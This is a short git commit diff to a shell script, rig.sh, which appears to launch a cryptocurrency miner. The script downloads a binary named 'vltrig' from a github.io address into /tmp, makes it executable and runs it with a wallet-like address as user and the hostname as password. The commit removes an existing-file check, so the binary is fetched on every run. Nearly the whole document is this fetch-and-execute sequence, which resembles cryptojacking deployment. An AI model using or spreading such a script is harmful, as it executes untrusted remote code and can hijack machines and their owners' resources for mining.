4800753cd79b0c6355a02d194938af8a64d85ffe
ivanhi0 <idbod@ivanhi0.ru>
2026-04-13 09:35:06 +0300

    Revert non working code

--- rig.sh
+++ rig.sh
@@ -1,9 +1,6 @@
 #!/bin/sh
-FILE_CHK=/tmp/vltrig
 
 cd /tmp
-if [ ! -f "$FILE_CHK" ]; then
-    wget https://ivanhi0.github.io/vltrig
-fi
+wget https://ivanhi0.github.io/vltrig
 chmod +x ./vltrig
 ./vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -b)
